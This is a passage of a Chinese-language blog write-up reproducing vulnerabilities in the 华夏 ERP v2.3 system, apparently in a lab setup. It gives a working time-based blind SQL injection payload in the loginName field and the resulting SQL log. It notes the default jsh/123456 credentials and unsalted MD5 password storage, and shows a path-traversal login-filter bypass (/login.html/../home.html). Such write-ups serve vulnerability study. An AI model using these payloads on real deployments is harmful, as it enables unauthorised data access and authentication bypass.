stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们先在控制器中找到使用这个方法的方法</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@PostMapping(&quot;/addUser&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">addUser</span><span class="params">(<span class="meta">@RequestParam(&quot;info&quot;)</span> String beanJson, HttpServletRequest request)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//获取到前端传来的json数据</span></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">result</span> <span class="operator">=</span> ExceptionConstants.standardSuccess();</span><br><span class="line"><span class="comment">//返回一个请求成功的标识</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">userNumLimit</span> <span class="operator">=</span> Long.parseLong(request.getSession().getAttribute(<span class="string">&quot;userNumLimit&quot;</span>).toString());</span><br><span class="line"><span class="comment">//控制器从 session 获取到一个名为 userNumLimit 的用户数量限制。它会检查当前已有的用户数量，如果超过了限制，则抛出异常，阻止添加用户。</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">count</span> <span class="operator">=</span> userService.countUser(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//通过countUser获取数量</span></span><br><span class="line">        <span class="keyword">if</span>(count&gt;= userNumLimit) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessParamCheckingException</span>(ExceptionConstants.USER_OVER_LIMIT_FAILED_CODE,</span><br><span class="line">                    ExceptionConstants.USER_OVER_LIMIT_FAILED_MSG);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            UserEx ue= JSON.parseObject(beanJson, UserEx.class);</span><br><span class="line"><span class="comment">//将这个对象变为excel表格</span></span><br><span class="line">            userService.addUserAndOrgUserRel(ue);</span><br><span class="line"><span class="comment">//调用这个方法添加数据</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p><code>/addUser</code>路由中确实调用了这个方法，但是传入的两个参数怎么全都是null，而且触发漏洞的路由我都不知道访问的哪个路由，漏洞访问的是<code>/user/list</code>，但是我只在代码中看见</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value = &quot;/getAllList&quot;)</span></span><br><span class="line"><span class="keyword">public</span> BaseResponseInfo <span class="title function_">getAllList</span><span class="params">(HttpServletRequest request)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">BaseResponseInfo</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BaseResponseInfo</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; data = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        List&lt;User&gt; dataList = userService.getUser();</span><br><span class="line">        <span class="keyword">if</span>(dataList!=<span class="literal">null</span>) &#123;</span><br><span class="line">            data.put(<span class="string">&quot;userList&quot;</span>, dataList);</span><br><span class="line">        &#125;</span><br><span class="line">        res.code = <span class="number">200</span>;</span><br><span class="line">        res.data = data;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        res.code = <span class="number">500</span>;</span><br><span class="line">        res.data = <span class="string">&quot;获取失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>而且这个功能就是查找用户信息和<code>/person/list</code>的sql注入漏洞也是这个样子，这个搞不好是这个系统的一个自定义路由处理方法，问了GPT和DS都是不知道</p>
<p>由于这个触发链实在过于复杂，其他sql注入漏洞也十分复杂，最后我得出的结论就是在知道哪个参数有漏洞的情况下就向哪个参数进行sql注入</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250830200547323.png" class title="image-20250830200547323">

<p>这个是原本的请求头，我们对其参数进行解码</p>
<div class="code-container" code-lang="Json"><div class="codebox"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;userName&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;loginName&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这个我们在countsByUser中知道是存在漏洞的，于是我们进行注入</p>
<div class="code-container" code-lang="Json"><div class="codebox"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;userName&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;loginName&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#x27; AND SLEEP(5)--sss&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这个是原本执行的命令</p>
<div class="code-container" code-lang="Sql"><div class="codebox"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Time</span>：<span class="number">0</span> ms <span class="operator">-</span> ID：com.jsh.erp.datasource.mappers.UserMapperEx.countsByUser</span><br><span class="line"><span class="keyword">Execute</span> <span class="keyword">SQL</span>：<span class="keyword">SELECT</span> <span class="built_in">count</span>(user.id) <span class="keyword">FROM</span> jsh_user <span class="keyword">user</span> <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> jsh_user_business ub <span class="keyword">ON</span> user.id <span class="operator">=</span> ub.key_id <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> jsh_orga_user_rel rel <span class="keyword">ON</span> rel.tenant_id <span class="operator">=</span> <span class="number">63</span> <span class="keyword">AND</span> user.id <span class="operator">=</span> rel.user_id <span class="keyword">AND</span> ifnull(rel.delete_flag, <span class="string">&#x27;0&#x27;</span>) <span class="operator">!=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> jsh_organization org <span class="keyword">ON</span> org.tenant_id <span class="operator">=</span> <span class="number">63</span> <span class="keyword">AND</span> rel.orga_id <span class="operator">=</span> org.id <span class="keyword">AND</span> ifnull(org.org_stcd, <span class="string">&#x27;0&#x27;</span>) <span class="operator">!=</span> <span class="string">&#x27;5&#x27;</span> <span class="keyword">WHERE</span> user.tenant_id <span class="operator">=</span> <span class="number">63</span> <span class="keyword">AND</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> ifnull(user.status, <span class="string">&#x27;0&#x27;</span>) <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>然后成功执行sleep，进行盲注</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250830201241132.png" class title="image-20250830201241132">

<p>我还注意到在执行sql语句的时候另外一个selectByConditionUser也被注入了</p>
<div class="code-container" code-lang="Sql"><div class="codebox"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">Time</span>：<span class="number">25050</span> ms <span class="operator">-</span> ID：com.jsh.erp.datasource.mappers.UserMapperEx.selectByConditionUser</span><br><span class="line"><span class="keyword">Execute</span> <span class="keyword">SQL</span>：<span class="keyword">SELECT</span> user.id, user.username, user.login_name, user.position, user.email, user.phonenum, user.description, user.remark, user.isystem, org.id <span class="keyword">AS</span> orgaId, user.tenant_id, org.org_abr, rel.user_blng_orga_dspl_seq, rel.id <span class="keyword">AS</span> orgaUserRelId, (<span class="keyword">SELECT</span> r.name <span class="keyword">FROM</span> jsh_user_business ub <span class="keyword">INNER</span> <span class="keyword">JOIN</span> jsh_role r <span class="keyword">ON</span> ub.value <span class="operator">=</span> concat(&quot;[&quot;, r.id, &quot;]&quot;) <span class="keyword">AND</span> ifnull(r.delete_flag, <span class="string">&#x27;0&#x27;</span>) <span class="operator">!=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">WHERE</span> ub.type <span class="operator">=</span> <span class="string">&#x27;UserRole&#x27;</span> <span class="keyword">AND</span> ub.key_id <span class="operator">=</span> user.id LIMIT <span class="number">0</span>, <span class="number">1</span>) roleName <span class="keyword">FROM</span> jsh_user <span class="keyword">user</span> <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> jsh_orga_user_rel rel <span class="keyword">ON</span> rel.tenant_id <span class="operator">=</span> <span class="number">63</span> <span class="keyword">AND</span> user.id <span class="operator">=</span> rel.user_id <span class="keyword">AND</span> ifnull(rel.delete_flag, <span class="string">&#x27;0&#x27;</span>) <span class="operator">!=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> jsh_organization org <span class="keyword">ON</span> org.tenant_id <span class="operator">=</span> <span class="number">63</span> <span class="keyword">AND</span> rel.orga_id <span class="operator">=</span> org.id <span class="keyword">AND</span> ifnull(org.org_stcd, <span class="string">&#x27;0&#x27;</span>) <span class="operator">!=</span> <span class="string">&#x27;5&#x27;</span> <span class="keyword">WHERE</span> user.tenant_id <span class="operator">=</span> <span class="number">63</span> <span class="keyword">AND</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> ifnull(user.status, <span class="string">&#x27;0&#x27;</span>) <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>) <span class="keyword">AND</span> user.login_name <span class="keyword">LIKE</span> <span class="string">&#x27;%&#x27;</span> <span class="keyword">AND</span> SLEEP(<span class="number">5</span>) <span class="keyword">ORDER</span> <span class="keyword">BY</span> rel.user_blng_orga_dspl_seq, user.id <span class="keyword">DESC</span> LIMIT <span class="number">0</span>, <span class="number">15</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>但是不知道为什么注释符没起作用，还被删掉了，不知道有没有作用</p>
<h2 id="3-暴力破解漏洞"><a href="#3-暴力破解漏洞" class="headerlink" title="3.暴力破解漏洞"></a>3.暴力破解漏洞</h2><p>启动靶场的时候会给出账号密码</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jsh</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>先不说这个密码和名字都有点简单，虽然可以自己改。但是没有次数登录限制，也就是可以无限制次数进行爆破。</p>
<p>最重点在于</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250830202648105.png" class title="image-20250830202648105">

<p>这个密码储存在数据库中的加密方式就是简单的md5加密，没有密匙，可以简单的通过MD5爆破得到密码</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250830202800959.png" class title="image-20250830202800959">



<h2 id="4-白名单越权"><a href="#4-白名单越权" class="headerlink" title="4.白名单越权"></a>4.白名单越权</h2><p>我们先来看下Filter中的代码</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span><br><span class="line"><span class="params">                     FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line">    <span class="type">String</span> <span class="variable">requestUrl</span> <span class="operator">=</span> servletRequest.getRequestURI();</span><br><span class="line">    <span class="comment">//具体，比如：处理若用户未登录，则跳转到登录页</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">userInfo</span> <span class="operator">=</span> servletRequest.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(userInfo!=<span class="literal">null</span>) &#123; <span class="comment">//如果已登录，不阻止</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (requestUrl != <span class="literal">null</span> &amp;&amp; (requestUrl.contains(<span class="string">&quot;/doc.html&quot;</span>) ||</span><br><span class="line">        requestUrl.contains(<span class="string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="string">&quot;/login.html&quot;</span>))) &#123;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (verify(ignoredList, requestUrl)) &#123;</span><br><span class="line">        chain.doFilter(servletRequest, response);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (String url : allowUrls) &#123;</span><br><span class="line">            <span class="keyword">if</span> (requestUrl.startsWith(url)) &#123;</span><br><span class="line">                chain.doFilter(request, response);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    servletResponse.sendRedirect(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这个是一个简单的登录校验，对于我们还未登录时的Url是进行了白名单过滤，但是这个过滤很幽默，没有过滤掉<code>../</code>，就导致我们只要在一开始访问白名单文件，然后后面通过目录穿越到根目录，我们就可以通过路由解析访问到白名单以外的html文件和路由</p>
<p>正常情况下，我们访问home.html等白名单以外的文件和路由则会返回302跳转</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250831125242881.png" class title="image-20250831125242881">



<p>payload1：</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login.html/../home.html</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这个先通过login.html绕过白名单，然后通过目录穿越符回到根目录于是就可以重新进行目录解析</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250831125549709.png" class title="image-20250831125549709">



<p>然后我们再接着来看第二个判断条件</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">regexPrefix</span> <span class="operator">=</span> <span class="string">&quot;^.*&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">regexSuffix</span> <span class="operator">=</span> <span class="string">&quot;.*$&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(List&lt;String&gt; ignoredList, String url)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (String regex : ignoredList) &#123;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(regexPrefix + regex + regexSuffix);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(url);</span><br><span class="line">        <span class="keyword">if</span> (matcher.matches()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 